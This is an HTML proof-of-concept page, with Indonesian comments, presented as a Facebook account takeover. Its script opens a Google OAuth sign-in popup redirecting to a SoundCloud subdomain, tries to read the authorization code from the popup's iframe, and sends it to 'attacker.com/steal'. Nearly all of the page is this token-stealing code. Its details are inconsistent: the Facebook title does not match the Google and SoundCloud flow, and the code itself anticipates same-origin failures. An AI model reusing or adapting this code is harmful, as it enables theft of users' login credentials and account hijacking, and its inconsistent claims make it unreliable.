<!DOCTYPE html>
<html>
<head>
    <title>POC ATO FACEBOOK</title>
</head>
<body>
    <h1>POC - Takeover Facebook Account</h1>
    
    <a href="#" id="authLink">Klik disini untuk memulai proses otorisasi</a>
    
    <script>
        document.getElementById('authLink').onclick = function() {
            // Buka jendela popup untuk otorisasi OAuth
            var targetWindow = window.open("https://accounts.google.com/v3/signin/identifier?opparams=%253Fcred_ref%253Dtrue%2526hd%253D*&client_id=YOUR_CLIENT_ID&redirect_uri=https%3A%2F%2Fcollins.soundcloud.org%2F&response_type=code&scope=openid+email", "_blank");

            // Tunggu dan ambil kode OAuth dari jendela popup
            var checkPopup = setInterval(function() {
                try {
                    // Periksa apakah jendela popup sudah ditutup
                    if (targetWindow.closed) {
                        clearInterval(checkPopup);
                        console.log("Popup closed");
                        return;
                    }

                    // Coba akses URL dari iframe di jendela popup
                    var iframeUrl = targetWindow.frames[0].location.href;

                    // Ekstrak kode OAuth dari URL
                    var urlParams = new URLSearchParams(new URL(iframeUrl).search);
                    var oauthCode = urlParams.get('code');
                    if (oauthCode) {
                        console.log("OAuth Code:", oauthCode);
                        // Kirim kode ke server penyerang
                        var xhr = new XMLHttpRequest();
                        xhr.open("GET", "https://attacker.com/steal?token=" + encodeURIComponent(oauthCode), true);
                        xhr.send();
                    }
                } catch (e) {
                    // Tangani kesalahan, biasanya karena pelanggaran SOP
                    console.log("Error accessing iframe URL:", e);
                }
            }, 1000); // Periksa setiap detik
        };
    </script>
</body>
</html>
